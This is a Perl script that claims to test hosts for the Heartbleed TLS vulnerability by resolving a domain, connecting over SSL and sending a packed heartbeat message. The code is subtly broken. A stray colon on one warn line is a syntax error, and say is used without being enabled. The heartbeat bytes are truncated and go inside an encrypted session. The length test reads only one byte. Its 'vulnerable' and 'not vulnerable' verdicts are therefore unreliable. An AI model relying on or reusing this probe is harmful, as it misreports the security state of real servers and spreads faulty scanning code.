#!/usr/bin/env perl

use strict;
no warnings;

use IO::Socket::SSL;
use Net::IP::Lite;
use Net::DNS;


my ($domain, $port, $timeout) = @ARGV;
die "Usage: $0 <domain> <port (OP)> <timeout (OP)>\n" unless defined $domain;
$port = 443 if not defined $port;
$timeout = 5 if not defined $timeout;

my $res = Net::DNS::Resolver->new;
my $query = $res->query($domain, 'A');

die "Query failed: $!\n" unless defined $query;

foreach my $rr ($query->answer) {
  next unless $rr->type eq 'A';
  my $ip = Net::IP::Lite->new($rr->address);
  next unless $ip;
  my $host = $ip->ip();
  my $socket = IO::Socket::SSL->new(
    PeerAddr => $host,
    PeerPort => $port,
    Timeout => $timeout,
  );
  
  unless ($socket) {
    warn "Failed to connect to $host:$port $!\n";
    next;
  }
  
  my $heartbeat = pack('H*', '180300000301');
  unless (syswrite $socket, $heartbeat) {
    warn "Failed to send heartbeat message to $host:$port $!\n":
    next;
  }
  
  my $buffer = '';
  unless (sysread $socket, $buffer, 5) {
    warn "Failed to read response from $host:$port $!\n";
    next;
  }
  
  if (length($buffer) == 5 && ord(substr($buffer, 0, 1)) == 0x18 && ord(substr($buffer, 1, 1)) == 0x03 && ord(substr($buffer, 3, 2)) < 0xffed) {
    say "$host:$port is vulnerable to HeartBleed!";
  } else {
    say "$host:$port is not vulnerable to HeartBleed!";
  }
  
  close $socket;
}
